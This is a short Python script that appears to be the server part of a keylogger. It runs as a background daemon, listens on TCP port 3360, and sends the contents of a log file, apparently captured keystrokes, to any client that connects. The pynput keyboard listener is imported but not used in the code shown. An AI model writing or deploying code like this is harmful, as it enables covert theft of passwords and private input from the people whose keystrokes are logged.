from pynput.keyboard import Listener
import logging
import daemon
import socket
import thread

logging.basicConfig(format="%(asctime)s:%(message)s")
file_logger = logging.FileHandler("/home/user0308/networking.log", "w")
logger = logging.getLogger()
logger.addHandler(file_logger)
logger.setLevel(logging.DEBUG)


def networking():
	logging.debug('in networking')
	sk = socket.socket()
	sk.bind(('', 3360))
	sk.listen(3)
	while True:
#		logging.info('in while loop')
		conn, address = sk.accept()
		# change logging position
		print(address)

		logging.info('out of loop')
		file = open('/home/user0308/logger.log', 'r')

		for line in file:
#			logging.info(line)
			conn.sendall(line)
		conn.close()

with daemon.DaemonContext(files_preserve=[file_logger.stream.fileno()]):
		networking()	

